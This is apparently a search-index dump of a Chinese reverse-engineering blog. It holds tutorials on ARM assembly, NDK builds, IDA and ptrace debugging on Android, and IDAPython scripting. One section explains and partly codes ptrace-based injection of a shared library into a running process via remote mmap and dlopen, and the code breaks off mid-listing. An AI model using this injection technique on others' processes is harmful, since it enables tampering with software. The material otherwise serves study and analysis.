@ToDo pop {r11, pc} .p2align 2 main_end: .size main, main_end-main 新建一个Android.mk文件. LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) #存储要构建的模块的名称 LOCAL_MODULE := LuoHello #列举源文件 LOCAL_SRC_FILES := Hello.s #包含编译脚本 include $(BUILD_EXECUTABLE) 新建一个Application.mk文件. APP_PLATFORM := android-16 APP_ABI := armeabi-v7a 命令行输入ndk-build进行编译. Arm_ndk_Build编译.7z ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:2","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm调试 准备一个Arm虚拟机或者真机 IDA调试 概述 将IDA中的dbgsrv程序放到Android系统中并运行起来,然后和IDA交互完成调试. 将ndk程序(LuoHello)以及IDA dbgsrv放到Android系统中 INSTALLAPP_PATH :=C:/Users/XiaLuoHun/Desktop/Build/libs/armeabi-v7a INSTALLAPP_NAME :=LuoHello INSTALLAPP :=$(INSTALLAPP_PATH)/$(INSTALLAPP_NAME) REMOTEPATH :=/data/local/tmp REMOTEAPP :=$(REMOTEPATH)/$(INSTALLAPP_NAME) IDADBGSERVER :=D:\\LuoHackTools\\Tools\\Disassemblers\\IDA_Pro_v7.5\\dbgsrv IDADBGSERVER_NAME := android_server install: adb push $(INSTALLAPP) $(REMOTEPATH) adb shell chmod a+x $(REMOTEAPP) adb shell $(REMOTEAPP) debug: adb forward tcp:23946 tcp:23946 adb push \"$(IDADBGSERVER)/$(IDADBGSERVER_NAME)\" $(REMOTEPATH) adb shell chmod a+x $(REMOTEPATH)/$(IDADBGSERVER_NAME) #IDA远程启动某个ndk程序调试 下面的方式是可以的, #但如果是附加调试 遍历进程时,会没有权限 要以Root权限运行才可以 adb shell $(REMOTEPATH)/$(IDADBGSERVER_NAME) Arm_IDA调试示例.7z IDA调试设置 远程启动 保证上述IDA dbgsrv运行起来 IDA远程启动 Main函数 调试推荐 定位Main函数. 找到Main函数后 F2下个断. F9选择调试器,配置好参数就可以调试了. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:3","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"寻址方式 寄存器寻址 mov r0, r1 add r0, r1, r2 add r0, r1 @等价于add r0, r0, r1 立即寻址 mov r0, #1 mov r0, #0x5678 movt r0, #0x1234 寄存器移位寻址 mov r0, r1, lsl #2 add r0, r1, lsl #2 add r0, r1, lsl r2 add r0, r1, lsr r2 寄存器间接寻址 ldr r0, [sp] 基址寻址 ldr r0, [sp, #4] @前基址 ldr r0, [sp], #4 @后基址 ldr r0, [sp, r0] 多寄存器寻址 stmfd sp!, {r0-r5, r8, pc} @!回写 会自动修改sp的值 ldmfd sp!, {r0-r5, r8, pc} 堆栈寻址 概述 堆栈方向 向上生长:向高地址方向生长, 称为递增堆栈 乡下生长:向低地址方向生长, 称为递减堆栈 满和空堆栈 堆栈方式 LDMFA LDMEA F:满 full E:空 empty STMFA STMFD A:加 add D:减 decrease 示例 stmfd sp!, {r0-r5, r8, pc} @!回写 会自动修改sp的值 ldmfd sp!, {r0-r5, r8, pc} 块拷贝寻址 ldmia ldmda i:inc d:dec ldmia ldmib a:after b:befor ldmia 取内容之后加4 ldmib 取内容之前加4 @inc dec after befor ldmia sp, {r0, r1} ldmda sp, {r0, r1} ldmib sp, {r0, r1} ldmdb sp, {r0, r1} 相对寻址 ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:4","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm指令格式 ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:5","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"存储器访问指令 单寄存器 概述 指令编码 加载指令 @单寄存器加载 ldr r0, [sp] @[sp] 4字节内容给r0 ldrb r0, [sp] @[sp] 1字节内容给r0 高位补0 ldrh r0, [sp] @[sp] 2字节内容给r0 高位补0 ldrd r0, [sp] @[sp] 8字节字节内容 给r0 存不下的放r1 @有符号 ldrsb r0, [sp] @[sp] 1字节内容给r0 高位补符号位 ldrsh r0, [sp] @[sp] 2字节内容给r0 高位补符号位 @上述指令加ex版本的表示原子操作(内存锁) 加t版本的为带用户特权(内核用) ldrex r0, [sp] 存储指令 @单寄存器存储 mov r0, sp @mov r1, #1 @str r1, [r0] @r1 4字节内容给[r0] @strb r1, [r0] @r1 1字节内容给[r0] @strh r1, [r0] @r1 2字节内容给[r0] @strd r2, [r0] @r2 r3 8字节内容给[r0] 寻址方式 @前变址 mov r3, sp ldr r0, [r3, #-4] @[r3-4] 4字节内容给r0 r3不变 @后变址 ldr r0, [r3], #-4 @[r3] 4字节内容给r0 r3 = r3 - 4 多寄存器 概述 指令编码 8种模式 加载指令 @inc dec after befor @加载 mov r3, sp ldmia r3, {r0-r2} @取内容之后加 将[r3] [r3+4] [r3+8]处的内容,依次给r0 r1 r2 ldmib r3, {r0-r2} @取内容之前加 将[r3+4] [r3+8] [r3+0xC]处的内容,依次给r0 r1 r2 ldmda r3, {r0-r2} @取内容之后减 将[r3] [r3-4] [r3-8]处的内容,依次给r2 r1 r0 ldmdb r3, {r0-r2} @取内容之前减 将[r3-4] [r3-8] [r3-0xC]处的内容,依次给r2 r1 r0 存储指令 @存储 mov r3, sp stmia r3, {r0-r2} @取内容之后加 将r0 r1 r2 依次给[r3] [r3+4] [r3+8] stmib r3, {r0-r2} @取内容之前加 将r0 r1 r2 依次给[r3+4] [r3+8] [r3+0xC] stmda r3, {r0-r2} @取内容之后减 将r2 r1 r0 依次给[r3] [r3-4] [r3-8] stmdb r3, {r0-r2} @取内容之前减 将r2 r1 r0 依次给[r3-4] [r3-8] [r3-0xC] 入栈出栈 @full dec 满递减 堆栈向下增长 与x86相同 @入栈 stmfd sp!, {r0-r2} @等同于x86中的 push r0 push r1 push r2 sp加!(回写)后,sp会自动修改(每次先减4,再存) @出栈 ldmfd sp!, {r0-r2} @等同于x86中的 pop r2 pop r1 pop r0 sp加!(回写)后,sp会自动修改(每次先加4,再存) 寄存器和存储器交换 @寄存器和存储器交换 swp r0, r1, [sp] @将[sp]的值给r0 r1的值给[sp] swp r0, r0, [sp] @将[sp]的值给r0 r0原来的值给[sp] 达到了寄存器和存储器交换的目的 swpb r2, r3, [sp] @将[sp]中1字节的值给r2,高位补0 r3中1字节的值给[sp] ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:6","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"数据处理指令 指令编码 操作码表 操作码 指令助记符 说明 0000 AND 逻辑与操作指令 0001 EOR 逻辑异或操作指令 0010 SUB 减法运算指令 0011 RSB 逆向减法指令 0100 ADD 加法运算指令 0101 ADC 带进位加法 0110 SBC 带进位减法指令 0111 RSC 带进位逆向减法指令 1000 TST 位测试指令 1001 TEQ 相等测试指令 1010 CMP 比较指令 1011 CMN 负数比较指令 1100 ORR 逻辑或操作指令 1101 MOV 数据传送 1110 BIC 位清除指令 1111 MVN 数据非传送 数据传送指令 @数据传送指令 mov r0, #1 @将1给r0 mvn r1, #0 @将0取反后的结果给r1 movt r2, #123 @将123的值给r2的高16位 算术逻辑运算指令 @算术逻辑指令 adds r1, r2, r2 @r1 = r2 + r2 影响标志寄存器 进位 Carry = 1 adc r1, r2, #2 @r1 = r2 + 2 + Carry位的值 add r1, r2, r2 @r1 = r2 + r2 不影响标志寄存器 subs r0, r1, #9 @r0 = r1 - 9 影响标志寄存器 借位 Carry = 0 sbc r0, r1, #5 @r0 = r1 - 5 - (Carry位取反的值) sub r0, r1, #5 @r0 = r1 - 5 不影响标志寄存器 rsb r0, r1, #5 @r0 = 5 - r1 rsc r0, r1, #5 @r0 = 5 - r1 - (Carry位取反的值) 注意 加法进位 Carry位为1 减法借位 Carry位为0 逻辑指令 @逻辑指令 mov r0, #-1 and r0, #0x80000001 @r0 = r0 \u0026 0x80000001 清零 orr r0, #0x80000001 @r0 = r0 | 0x80000001 置位 eor r0, #0xff @r0 = r0 ^ 0x80000001 按位取反 bic r0, #0xff @r0 = r0 \u0026 (~0xff) 比较指令 @比较指令 cmp r0, #3 @r0 - 3 cmn r0, #3 @r0 - (-3) 负数比较 tst r0, #3 @r0 \u0026 3 tst r0, r0 @判r0是否为0 teq r0, r1 @r0 ^ r1 判r0与r1是否相等 乘法指令 @乘法指令 mul r2, r0, r1 @32位乘法 r2 = (r0 * r1)的结果只取低32位 mla r2, r0, r1, r3 @32位乘法 r2 = (r3 + (r0 * r1))的结果只取低32位 mls r2, r0, r1, r3 @32位乘法 r2 = (r3 - (r0 * r1))的结果只取低32位 umull r2, r0, r1, r3 @64位无符号 (r1 * r3)的结果,低32位放r2 高32位结果放r0 umlal r2, r0, r1, r3 @64位无符号 r2作为低32位 r0作为高32位组成64位 加上r1 * r3的结果,低32位放r2 高32位放r0 umaal r2, r0, r1, r3 @64位无符号 (r2 + r0 + r1 * r3)的结果,低32位放r2 高32位结果放r0 smull r2, r0, r1, r3 @64位有符号 (r1 * r3)的结果,低32位放r2 高32位结果放r0 smlal r2, r0, r1, r3 @64位有符号 r2作为低32位 r0作为高32位组成64位 加上r1 * r3的结果,低32位放r2 高32位放r0 smmul r2, r1, r3 @(r1 * r3)的结果,高32位放r2 smmla r2, r0, r1, r3 @r2 = (r3 + (r0 * r1)的高32位) smmls r2, r0, r1, r3 @r2 = (r3 - (r0 * r1)的高32位) 除法指令 没有特定的指令,需要依靠其他指令做优化来完成除法运算. 编译器已将做好了库,直接调用即可. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:7","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"跳转指令 概述 条件码 b的后面可以跟条件码,如beq,bne. 指令编码 IDA静态分析,切换指令集 指令示例 B push {r11, lr} mov r0, 1 mov r1, 2 mov lr, pc @使用b指令来调用函数,需要自己设置LR寄存器,十分不方便. b my_add pop {r11, pc} my_add: add r0, r0, r1 mov pc, lr BL bl所在的指令集和所调函数的指令集相同. push {r11, lr} mov r0, 2 mov r1, 4 bl my_add @使用bl指令来调用函数,不需要自己设置LR寄存器 pop {r11, pc} my_add: add r0, r0, r1 mov pc, lr bl所在的指令集和所调函数的指令集不同. @bl 下面所示的调用会崩,没有切换指令集 push {r11, lr} .code 32 @arm指令集 mov r0, 2 mov r1, 4 bl my_add @使用bl指令来调函数,不需要自己设置LR寄存器,但是无法自动切换指令集,即标志寄存器的T位. pop {r11, pc} my_add: .code 16 @thumb指令集 add r0, r0, r1 mov pc, lr BX @bx 后面跟的只能是寄存器 push {r11, lr} .code 32 @arm指令集. mov r0, 3 mov r1, 5 @ cpu计算偏移的时候,会忽略地址的低位. add r2, pc, #9 @1. 需要自己算偏移,状态的切换由地址的最低位来决定,0:arm指令,1:thumb指令 mov lr, pc @2. 需要自己设置LR寄存器. bx r2 @ 会根据地址的最低位,自动切换状态,即标志寄存器T位的值. pop {r11, pc} my_add: .code 16 @thumb指令集. add r0, r0, r1 @mov pc, lr bx lr @3. 状态切换,由地址低位来决定,0:arm指令,1:thumb指令. BLX push {r11, lr} .code 32 mov r0, 1 mov r1, 2 blx my_add @会自动切状态,T位取反. pop {r11, pc} my_add: .code 16 @thumb指令集. add r0, r0, r1 @mov pc, lr bx lr @3. 状态切换,由地址低位来决定,0:arm指令,1:thumb指令. TBB @tbb thumb2指令才可以用,常用来做SwitchCase push {r11, lr} blx thumb2 .code 16 thumb2: add r2, pc, #8 mov r3, #2 tbb [r2, r3] @PC = PC + (R2 + R3)内存地址处取一字节然后乘以2 table1: .byte 0 .byte 1 .byte 2 .byte 3 case1: mov r0, r1 pop {r11, pc} TBH 表跳转半字 B:byte H:half PC = PC + ZeroExtend( Memory( Rn + Rm « 1, 2) « 1) ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:8","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"其他指令 中断指令 swi #中断号 svc #中断号 系统调用_exit 看下系统底层是如何调_exit这个API的: 测试代码: mov r0, 0 bl _exit 操作: IDA调试,F7跟进_exit. 结论: Android系统调API的中断是0. _exit的api编号是0xF8. 喜讯 Android 0环Api调用的参数与3环参数相同. 目前Android所有版本API编号一样. 这与Windows有所不同,Windows不同版本,API编号也不一样. Android Ndk目录中有一个文件(unistd-common.h)记录了所有的API编号, ndk编程中不同指令集要包含不同路径下的unistd-common.h. Arm调用_exit示例 @调用_exit示例 mov r0, 0 mov r7, #0xF8 svc #0 NDK编程调用_exit示例 #include \u003csyscall.h\u003e //包含这个文件会根据指令集包含一个合适的头文件#include \u003cunistd.h\u003e extern \"C\" JNIEXPORT void JNICALL Java_org_example_luondk_MainActivity_TstExit(JNIEnv *env, jobject thiz) { //查看unistd-common.h. 我们发现exit对应的api编号为 __NR_exit_group, 即0xF8,十进制的248 //可通过调用syscall 就不用我们手写汇编了 //调用的api,后面有几个参数,就传几个参数 syscall(__NR_exit_group, 0); } 标志寄存器 @读标志寄存器 mrs r0, cpsr @改标志寄存器,只能修改高8位,其他无权限 mov r0, 0xffffffff msr cpsr_cfsx, r0 msr cpsr_f, r0 伪指令 解决偏移问题 ADR @add r0, pc, #8 @计算到code1的偏移. @上面那种写法的痛点在于 如果这条语句和code1之间新增了指令,就需要重新计算偏移. adr code1 @我们可以使用adr伪指令来代替上面的那条很不舒服的指令,编译器会帮我们计算偏移. mov r0, r1 mov r0, r1 mov r0, r1 code1: mov r0, #3 ADRL adrl能计算的偏移更大,但是目前版本的编译器不能使用该伪指令. 解决给立即数问题 LDR @伪指令 LDR ldr r0, =0xff1 @伪指令给立即数,后面要写= ldr r2, =0x55668899 NOP 目前nop指令已不是伪指令了,在早期版本nop指令是伪指令. 早期nop伪指令对应的汇编语句为 mov r0, r0. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:9","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"浮点指令 寄存器: float: s0-s31 double: d0-d31 在常规指令前加V即可,如VADD,VSUB,VMOV. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:10","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm指令参考 ARM-Thumb2指令集速查卡.pdf ARMv8-arm64指令集速览表.pdf ARM矢量浮点指令集参考手册.pdf ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:11","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm应用 内联汇编 LuoHello.cpp #include \u003cstdio.h\u003e int main(){ //单行 __asm__(\"mov r0, r1\"); //多行,每一行的后面要有换行符 __asm__( \"mov r2, r1\\n\" \"mov r1, r1\\n\" \"mov r3, r4\\n\" \"mov r1, r1\\n\" ); printf(\"Hello Arm\\n\"); return 0; } Arm_内联汇编.7z 裸函数 //裸函数 extern \"C\" __attribute__((naked)) int MySub(int n1, int n2){ __asm__( \"sub r0, r0, r1\\n\" \"bx lr\" ); } 混合编译 源文件 LuoArm.s .text .globl LuoAdd .globl LuoSub @.extern MySub .p2align 2 .type LuoAdd,%function .code 32 LuoSub: push {r11, lr} @汇编调C bl MySub pop {r11, lr} bx lr LuoAdd: push {r11, lr} add r0, r0, r1 pop {r11, lr} bx lr .p2align 2 LuoAdd_end: .size LuoAdd, LuoAdd_end-LuoAdd LuoHello.cpp #include \u003cstdio.h\u003e //裸函数 extern \"C\" __attribute__((naked)) int MySub(int n1, int n2){ __asm__( \"sub r0, r0, r1\\n\" \"bx lr\" ); } extern \"C\" int LuoAdd(int n1, int n2); extern \"C\" int LuoSub(int n1, int n2); int main(){ //C++调汇编 printf(\"LuoAdd: 2 + 3 = %d\\n\", LuoAdd(2, 3)); printf(\"MySub: 6 - 1 = %d\\n\", LuoSub(6, 1)); return 0; } Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) #存储要构建的模块的名称 LOCAL_MODULE := LuoHello #列举源文件 LOCAL_SRC_FILES := LuoHello.cpp LuoArm.s #链接选项 LOCAL_CPPFLAGS := -marm #包含编译脚本 include $(BUILD_EXECUTABLE) Application.mk APP_PLATFORM := android-16 APP_ABI := armeabi-v7a Arm_混合编译.7z 编译 输入ndk-build进行编译. 运行 确保Android虚拟机在开着. 调试 调试api https://man7.org/linux/man-pages/man2/ptrace.2.html long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); //参数一:request的宏定义很多,可以参考上面的网址. //PTRACE_ATTACH 附加 //PTRACE_CONT 继续执行 //PTRACE_PEEKTEXT, PTRACE_PEEKDATA 读数据 //PTRACE_GETREGSET 获取寄存器信息 //PTRACE_SETREGSET 设置寄存器信息 调试示例 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \u003cunistd.h\u003e#include \u003csys/ptrace.h\u003e#include \u003csys/types.h\u003e#include \u003csys/wait.h\u003e int main() { printf(\"Main Start:%d\\n\", getpid()); fflush(stdout); int childPid = fork(); if (childPid == 0) { while (true) { sleep(1); printf(\"childPid: %d......\\n\", getpid()); fflush(stdout); } } else { //附加子进程 if (ptrace(PTRACE_ATTACH, childPid, 0, 0) \u003c 0) { perror(\"PTRACE_ATTACH\"); fflush(stdout); return 0; } //等调试事件 waitpid(childPid, NULL, WUNTRACED); printf(\"PTRACE_ATTACH OK\\n\"); fflush(stdout); //继续执行 if (ptrace(PTRACE_CONT, childPid, 0, 0) \u003c 0) { perror(\"PTRACE_CONT\"); fflush(stdout); return 0; } printf(\"PTRACE_CONT OK\\n\"); fflush(stdout); } //等待子进程结束 waitpid(childPid, NULL, WUNTRACED); printf(\"Main End:%d\\n\", getpid()); fflush(stdout); return 0; } Arm_LuoDebug.7z 需要注意的是,不是父子进程之间调试,就需要root权限. 代码注入 思路 在远程进程中申请一段地址空间,将要注入的动态库文件的路径写进去,然后在远程进程中调dlopen函数将动态库加载到内存中. 细节 ①如何在远程进程中申请地址空间? 我们知道在自身进程中,可以调用mmap函数来申请地址空间.我们可以附加远程进程,将pc寄存器的值设置为远程进程中mmap函数的地址(这个地方需要注意的就是pc寄存器值的低位不可能为1),然后运行程序,函数的返回值就是申请的地址空间. ②如何计算远程api函数的地址? 远程api函数地址 = 远程api函数所在模块基址 + (自身进程api函数地址 - 自身进程api函数所在的基址). ③如何知道api函数在哪个模块中? 我们可以在自身进程中打印api函数地址以及所有的内存模块地址,比对api函数地址在哪个内存模块地址范围内,即可知道api函数所在的模块. ④如何知道远程进程api函数执行完毕? 我们在执行远程进程api函数之前,将lr寄存器的值设置为0,这样远程进程api函数执行完毕,就会产生异常.我们可以调用waitpid这个函数来等待异常(这个函数在异常没来之前会阻塞),当执行到waitpid的下一行的时候,说明远程进程api函数已经执行完毕. 源代码 注入的目标程序 #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e int main() { while (true) { sleep(1); printf(\"Inject Target: %d\\n\", getpid()); fflush(stdout); } return 0; } 注入的动态库 #include \u003cstdio.h\u003e __attribute__((constructor)) void LuoLoad() { printf(\"Hello LuoLoad\\n\"); fflush(stdout); } 注入程序 步骤: 附加目标进程. 保存寄存器环境. 修改寄存器环境. 在远程进程中申请地址空间. 将库路径写入申请的地址空间中. 将远程进程dlopen的地址给pc寄存器. 还原寄存器环境. 取消附加. #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003csys/ptrace.h\u003e#include \u003candroid/log.h\u003e#include \u003cerrno.h\u003e#include \u003csys/types.h\u003e#include \u003csys/wait.h\u003e#include \u003csys/mman.h\u003e#include \u003cdlfcn.h\u003e #include \u003candroid/log.h\u003e#include \u003ccstring\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"Luo\", __VA_ARGS__); //显示寄存器的值 void show_regs(pt_regs *pRegs) { for (int i = 0; i \u003c 16; ++i) { if (i == 13) { printf(\"SP:%08X\\t\", pRegs[i]); } else if (i == 14) { printf(\"LR:%08X\\t\", pRegs[i]); } else if (i == 15) { printf(\"PC:%08X\\t\", pRegs[i]); } else { printf(\"R%d:%08X\\t\", i, pRegs[i]); } fflush(stdout); if (i == 7) { printf(\"\\n\"); fflush(stdout); } } printf(\"\\n\"); fflush(stdout); } //获取远程注","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:12","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["IDA"],"content":"IDAPython使用笔记 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:0:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"简介 IDAPython核心有如下3个Python模块: idc:负责提供idc中所有的函数功能. idautils:提供大量的实用函数,其中许多函数可生成各种数据库相关对象(如函数或交叉引用)的python列表. idaapi:允许使用者通过类的形式,访问更多底层的数据. 需要注意的是IDAPython会自动导入idc和idautils模块,idaapi模块需要自己手工导入. 为了使用的清晰性,建议在开头都进行手工的import这三个模块. 注意事项 由于IDAPython的升级,有些之前的函数名发生了变化,新旧关系的对应在文件idc_bc695.py,可以进行对照说明. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:1:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置调试环境 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置Python 安装必备的库 cd 到IDA当前使用的Pyhton版本的pip.exe目录中 pip install tornado pip install debugpy ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:1","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置环境变量 修改PYTHONPATH环境变量.安装Python时,默认是不会自动进行配置的,所以如果没有的话要先新建一个. . D:\\LuoHackTools\\Tools\\Disassemblers\\IDA_Pro_v7.5\\python\\3 D:\\LuoHackTools\\Tools\\Disassemblers\\IDA_Pro_v7.5\\plugins 修改ida_idaapi.py文件 这里我修改的路径为: D:/LuoHackTools/Tools/Disassemblers/IDA_Pro_v7.5/python/3/ida_idaapi.py ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:2","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置VSCode 安装IDACode 配置IDACode,本机调试,默认即可 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:3","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置IDA 安装IDACode插件 https://github.com/ioncodes/idacode/releases 修改idacode_utils/settings.py文件,将Python路径设置为IDA所用的Python路径 此时已经配置好调试环境了,打开IDA,查看输出窗口是否有如下提示,若有则说明成功! [IDACode] Plugin version 0.3.0 [IDACode] Plugin loaded, use Edit -\u003e Plugins -\u003e IDACode to start the server ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:4","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"使用示例 测试代码 import idautils import idaapi import idc print(\"Hello IDAPython\") IDA启用IDACode插件 VSCode连接IDA 设置工作区 将Python脚本所在文件夹添加到工作区 连接IDA Ctrl + Shift + P, 调出命令窗口 调试的话,就选带debugger的. 出错情况应对 此时VSCode可能会出现两种错误 解决方法如下: 重启IDA,保证VSCode有且只有一个工作区文件夹. 运行脚本 由于插件有保存后直接发送到IDA中运行的功能,所以按下Ctrl+S就能看到脚本被执行. 调试 由于我们并不是直接在VSCode环境中运行脚本,所以传统方式设置的断点是断不到的,应该采用如下的方式设置断点. import idautils import idaapi import idc print(\"Hello IDAPython\") n = 5 print(\"Befor breakpoint\") breakpoint() print(\"After breakpoint\") n = 10 需要注意的是,不要将breakpoint放到文件末尾,因为调试的时候,他会断在breakpoint的下条语句. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:5","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置Python代码自动补全 VSCode下载Visual Studio IntelliCode插件 安装微软Python语言服务 第1步执行完后,当进行编码时,VSCode会自动提醒你安装 微软Python语言服务(不安装的话,每次打开vscode都会提醒你安装),点击 Enable it and Reload Window 按钮,接下来就是比较漫长的等待. 打开VSCode的setting.json 修改Setting文件,添加需要自动补全代码的Python文件所在路径. 接下来,在VSCode中书写IDAPython代码就会自动补全代码了. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:3:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"基本操作 获取当前地址: idc.here() idc.get_screen_ea() 获取当前地址空间的最小地址和最大地址: idc.MinEA() idc.MaxEA() 在ida的反汇编窗口中,下面的每一个信息都可以用函数获取到. .text:0043375E mov esi, [eax+0Ch] Python\u003e idc.get_segm_name(here()) '.text' Python\u003e idc.GetDisasm(here()) 'mov esi, [eax+0Ch]' Python\u003eidc.print_insn_mnem(here()) 'mov' Python\u003eidc.print_operand(here(),0) 'esi' Python\u003eidc.print_operand(here(),1) '[eax+0Ch]' ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:4:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"段操作 打印一行数据好像并没什么卵用,但是IDAPython的强大之处在于它能遍历所有的指令, 所有的交叉引用地址,还有搜索所有的代码和数据.后面两项功能稍后再做介绍,我们 先从遍历所有段的指令开始讲起. import idc import idautils import idaapi for seg in idautils.Segments(): print(idc.get_segm_name(seg),idc.get_segm_start(seg),idc.get_segm_end(seg)) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:5:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"函数 遍历所有函数: for func in idautils.Functions(): print(func,idc.get_func_name(func)) **Functions()**将返回一个保存着已知函数首地址的数组,同样此函数也可以用来查找在指定地址范围的函数列表. **get_func_name(ea)**用来获取函数名,ea这个参数可以是处于函数中的任何地址. **idaapi.get_func_qty()**获取此binary中识别的函数的个数. **idaapi.getn_func(1)**获取第1个函数的对象. 获取函数的边界信息: Python\u003eidaapi.get_func(here()) \u003cida_funcs.func_t; proxy of \u003cSwig Object of type 'func_t *' at 0x0000026DF330AE40\u003e \u003e Python\u003eidaapi.get_func(here()).start_ea 0x43371b Python\u003eidaapi.get_func(here()).end_ea 0x4337c4 同时也可以使用**idc.get_next_func(ea)和idc.get_prev_func(ea)**获取ea地址的后一个函数和前一个函数,ea 的值需要在被分析的函数地址之内.在枚举函数的时候,只有IDA将这段代码标记为函数的时候才行,不然会在枚举的过程中被跳过.没有被标记为函数的代码将在图例(ida顶部的彩色条)中标为红色.当然我们可以手工的修复这些无法被标记为函数的代码. 还可以使用如下两个api来获取函数的边界地址: Python\u003eidc.get_func_attr(here(), FUNCATTR_START) 0x43371b Python\u003eidc.get_func_attr(here(), FUNCATTR_END) 0x4337c4 get_func_attr的第二个参数有如下值: FUNCATTR_START = 0 # readonly: function start address FUNCATTR_END = 4 # readonly: function end address FUNCATTR_FLAGS = 8 # function flags FUNCATTR_FRAME = 16 # readonly: function frame id FUNCATTR_FRSIZE = 20 # readonly: size of local variables FUNCATTR_FRREGS = 24 # readonly: size of saved registers area FUNCATTR_ARGSIZE = 28 # readonly: number of bytes purged from the stack FUNCATTR_FPD = 32 # frame pointer delta FUNCATTR_COLOR = 36 # function color code FUNCATTR_OWNER = 16 # readonly: chunk owner (valid only for tail chunks) FUNCATTR_REFQTY = 20 # readonly: number of chunk parents (valid only for tail chunks) 利用函数名获取一个函数的地址: Python\u003eidc.get_name_ea_simple(\"sub_43371B\") 0x43371b 遍历函数的所有指令: import idc import idautils import idaapi start = idc.get_func_attr(idc.here(),idc.FUNCATTR_START) end = idc.get_func_attr(idc.here(), idc.FUNCATTR_END) curr_addr = start while curr_addr \u003c= end: print(hex(curr_addr),idc.GetDisasm(curr_addr)) curr_addr = idc.next_head(curr_addr,end) 